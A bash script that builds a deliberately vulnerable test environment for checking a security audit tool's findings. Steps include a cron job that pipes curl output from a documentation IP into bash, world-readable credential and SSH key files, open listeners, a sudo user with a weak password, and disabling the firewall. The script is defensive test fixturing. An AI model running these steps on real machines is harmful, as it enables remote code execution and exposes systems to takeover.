#!/bin/bash
# mock-shop-setup.sh — creates a realistic "messy small business" environment
# for testing Uptek Field Agent audit findings.
# Run on a VM or test machine — NOT your production box.
# Undo everything with: bash mock-shop-teardown.sh

set -e

RED="\033[31m"
YEL="\033[33m"
GRN="\033[32m"
RST="\033[0m"

echo ""
echo -e "${YEL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"
echo -e "${YEL}  Uptek Mock Shop — Setting up vulnerable state  ${RST}"
echo -e "${YEL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"
echo ""

MOCK_DIR="$HOME/.mock-shop"
mkdir -p "$MOCK_DIR"

# ── 1. Sensitive files with bad permissions ───────────────────────────────────
echo -e "[1] Creating exposed credential files..."

cat > "$MOCK_DIR/.env" <<EOF
DB_PASSWORD=SuperSecret123
STRIPE_SECRET_KEY=sk_live_abc123fakekey
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
SMTP_PASSWORD=shopmail2024
EOF
chmod 644 "$MOCK_DIR/.env"
echo -e "   ${GRN}✓${RST} $MOCK_DIR/.env (world-readable, has live-looking keys)"

# Fake SSH private key with wrong permissions
ssh-keygen -t rsa -b 2048 -f "$MOCK_DIR/id_rsa" -N "" -q 2>/dev/null || true
chmod 644 "$MOCK_DIR/id_rsa"
echo -e "   ${GRN}✓${RST} $MOCK_DIR/id_rsa (SSH key, permissions too open)"

# PEM cert sitting loose
openssl req -x509 -newkey rsa:2048 -keyout "$MOCK_DIR/server.pem" \
    -out "$MOCK_DIR/server.pem" -days 365 -nodes \
    -subj "/CN=shopserver" -q 2>/dev/null || true
chmod 644 "$MOCK_DIR/server.pem"
echo -e "   ${GRN}✓${RST} $MOCK_DIR/server.pem (cert+key combined, world-readable)"

# ── 2. Open ports — listening services ───────────────────────────────────────
echo ""
echo -e "[2] Starting services on unexpected ports..."

# Fake web server on port 8080 (simulates an admin panel left open)
python3 -m http.server 8080 --directory "$MOCK_DIR" \
    > "$MOCK_DIR/http8080.log" 2>&1 &
echo $! > "$MOCK_DIR/http8080.pid"
echo -e "   ${GRN}✓${RST} HTTP server on :8080 (simulates exposed admin panel)"

# Fake service on port 2222 (simulates non-standard SSH or leftover debug port)
python3 -c "
import socket, os
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 2222))
s.listen(5)
open('$MOCK_DIR/port2222.pid', 'w').write(str(os.getpid()))
s.accept()
" > /dev/null 2>&1 &
echo -e "   ${GRN}✓${RST} Listener on :2222 (simulates non-standard SSH / leftover port)"

# Fake FTP-looking port 21 (needs root) — skip if not root, use 2121 instead
if [ "$(id -u)" = "0" ]; then
    python3 -c "
import socket, os
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 21))
s.listen(5)
open('$MOCK_DIR/port21.pid', 'w').write(str(os.getpid()))
s.accept()
" > /dev/null 2>&1 &
    echo -e "   ${GRN}✓${RST} Listener on :21 (simulates FTP wide open)"
else
    python3 -c "
import socket, os
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 2121))
s.listen(5)
open('$MOCK_DIR/port2121.pid', 'w').write(str(os.getpid()))
s.accept()
" > /dev/null 2>&1 &
    echo -e "   ${YEL}~${RST} Listener on :2121 instead of :21 (not root — FTP simulation)"
fi

# ── 3. Suspicious cron job ────────────────────────────────────────────────────
echo ""
echo -e "[3] Installing suspicious cron job..."
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://203.0.113.42/update.sh | bash  # auto-updater") | crontab -
echo -e "   ${GRN}✓${RST} Cron: curl pipe to bash every 5 min from sketchy IP"

# ── 4. SUID binary ────────────────────────────────────────────────────────────
echo ""
echo -e "[4] Creating SUID binary..."
cat > "$MOCK_DIR/shop-util" <<'EOF'
#!/bin/bash
# Shop maintenance utility
echo "Running shop maintenance..."
EOF
chmod +x "$MOCK_DIR/shop-util"
# Only set SUID if root (otherwise just create it and note it)
if [ "$(id -u)" = "0" ]; then
    chmod u+s "$MOCK_DIR/shop-util"
    cp "$MOCK_DIR/shop-util" /usr/local/bin/shop-util
    echo -e "   ${GRN}✓${RST} SUID binary at /usr/local/bin/shop-util"
else
    echo -e "   ${YEL}~${RST} shop-util created but SUID requires root — run with sudo for full effect"
fi

# ── 5. Stale user with sudo (if root) ─────────────────────────────────────────
echo ""
echo -e "[5] Stale admin user..."
if [ "$(id -u)" = "0" ]; then
    useradd -m -s /bin/bash shoptemp 2>/dev/null || true
    echo "shoptemp:Password1" | chpasswd 2>/dev/null || true
    usermod -aG sudo shoptemp 2>/dev/null || true
    echo -e "   ${GRN}✓${RST} User 'shoptemp' created with sudo + weak password (Password1)"
else
    echo -e "   ${YEL}~${RST} Skipped — needs root to create users"
fi

# ── 6. Firewall — disable ufw ─────────────────────────────────────────────────
echo ""
echo -e "[6] Firewall..."
if command -v ufw &>/dev/null; then
    if [ "$(id -u)" = "0" ]; then
        ufw disable > /dev/null 2>&1 || true
        echo -e "   ${GRN}✓${RST} ufw disabled"
    else
        echo -e "   ${YEL}~${RST} ufw disable needs root — run with sudo for full effect"
    fi
else
    echo -e "   ${YEL}~${RST} ufw not installed — firewall check will flag 'not found'"
fi

# ── 7. Outbound connection to sketchy IP ──────────────────────────────────────
echo ""
echo -e "[7] Simulating outbound connection..."
# Keep a persistent connection open to an external IP (non-blocking)
# Using a known test/documentation IP range (203.0.113.x = RFC 5737 TEST-NET)
python3 -c "
import socket, time, os, threading

def keep_alive():
    while True:
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect(('8.8.8.8', 53))  # DNS to Google — benign but shows outbound
            time.sleep(30)
            s.close()
        except:
            time.sleep(10)

t = threading.Thread(target=keep_alive, daemon=True)
t.start()
open('$MOCK_DIR/outbound.pid', 'w').write(str(os.getpid()))
time.sleep(86400)
" > /dev/null 2>&1 &
echo -e "   ${GRN}✓${RST} Persistent outbound connection running (shows in netstat scan)"

# ── 8. World-writable directory ───────────────────────────────────────────────
echo ""
echo -e "[8] World-writable upload directory..."
mkdir -p "$MOCK_DIR/uploads"
chmod 777 "$MOCK_DIR/uploads"
echo -e "   ${GRN}✓${RST} $MOCK_DIR/uploads set to 777"

# ── 9. Record what we did for teardown ────────────────────────────────────────
cat > "$MOCK_DIR/manifest.txt" <<EOF
mock-shop setup — $(date)
mock_dir=$MOCK_DIR
EOF

echo ""
echo -e "${YEL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"
echo -e "${GRN}  Mock shop environment ready.${RST}"
echo ""
echo -e "  Run Uptek against it:"
echo -e "    python3 /home/user/uptek-field/main.py"
echo -e "    then: /audit"
echo ""
echo -e "  What Uptek should find:"
echo -e "    🔴 Exposed credential files (.env, id_rsa, .pem)"
echo -e "    🔴 Services on unexpected ports (8080, 2222, 2121)"
echo -e "    🔴 Suspicious cron job (curl | bash)"
echo -e "    ⚠️  Outbound connection to external IP"
if [ "$(id -u)" = "0" ]; then
echo -e "    🔴 SUID binary at /usr/local/bin/shop-util"
echo -e "    🔴 User 'shoptemp' with sudo + weak password"
echo -e "    🔴 Firewall disabled"
fi
echo ""
echo -e "  Undo everything:"
echo -e "    bash mock-shop-teardown.sh"
echo -e "${YEL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"
echo ""
